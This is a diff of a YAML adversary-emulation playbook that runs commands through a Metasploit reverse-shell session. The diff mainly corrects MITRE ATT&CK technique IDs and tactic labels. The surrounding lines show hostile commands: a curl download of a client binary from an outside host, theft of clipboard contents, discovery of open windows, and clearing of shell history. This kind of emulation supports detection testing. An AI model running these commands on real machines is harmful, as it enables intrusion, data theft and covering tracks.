@@ -209,14 +209,15 @@ commands:
   - type: msf-session
     cmd: curl -o /home/judy/.local/bin/veiltransfer_client_linux suspicious-website.com:8082/index
     session: revshell
-
+    
   # get the last clipboard entry
   - type: msf-session
     session: revshell
     cmd: xclip -selection clipboard -o
     metadata:
-      techniques: "T1515"
-      tactics: "Exfiltration"
+      techniques: "T1115"
+      tactics: "Collection"
+      technique_name: "Clipboard Data"
 
   # save the meterpreter payload in /home
   - type: msf-session
@@ -235,22 +236,25 @@ commands:
     metadata:
       techniques: "T1029"
       tactics: "Exfiltration"
+      technique_name: "Scheduled Transfer"
 
   # find out which windown are open
   - type: msf-session
     session: revshell
     cmd:  wmctrl -l
     metadata:
-      techniques: "T010"
-      tactics: "Exfiltration"
+      techniques: "T1010"
+      tactics: "Discovery"
+      technique_name: "Application Window Discovery"
 
   # clear history
   - type: msf-session
     session: revshell
     cmd: history -c
     metadata:
-      techniques: "T1565"
+      techniques: "T1565.001"
       tactics: "Defensive Evasion"
+      technique_name: "Data Manipulation: Stored Data Manipulation"
 
   # exit the interactive shell
   - type: msf-session
